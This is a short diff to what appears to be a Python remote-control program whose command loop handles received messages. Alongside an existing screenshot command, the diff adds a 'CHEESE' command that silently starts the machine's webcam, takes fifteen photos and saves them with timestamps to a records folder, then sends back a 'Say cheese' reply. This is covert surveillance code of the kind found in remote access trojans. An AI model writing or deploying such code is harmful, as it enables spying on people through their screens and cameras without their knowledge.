@@ -49,7 +49,23 @@ while True:
     elif(mensagem_decode.upper() == "SCREENSHOT"):
         fig = pyautogui.screenshot(r)
         fig.save(r'fig.png')
-
+        
+    elif(mensagem_decode.upper() == "CHEESE"):
+        def say_cheese():
+            pygame.init()
+            pygame.camera.init()
+            cheese = pygame.camera.Camera("/dev/video0", (800,600))
+            i = 0
+            while i < 15:
+                cheese.start()
+                imagem = cheese.get_image()
+                cheese.stop()
+                save = time.strftime("%d-%m-%Y_%H%M%S", time.localtime())
+                file = "registros/{}.jpg".format(save)
+                pygame.image.save(imagem, file)
+                i += 1
+        mensagem = "Say cheese {}".format(say_cheese())
+        
     else:
         mensagem = "\nComando nao reconhecido no sistema, tente novamente"
 
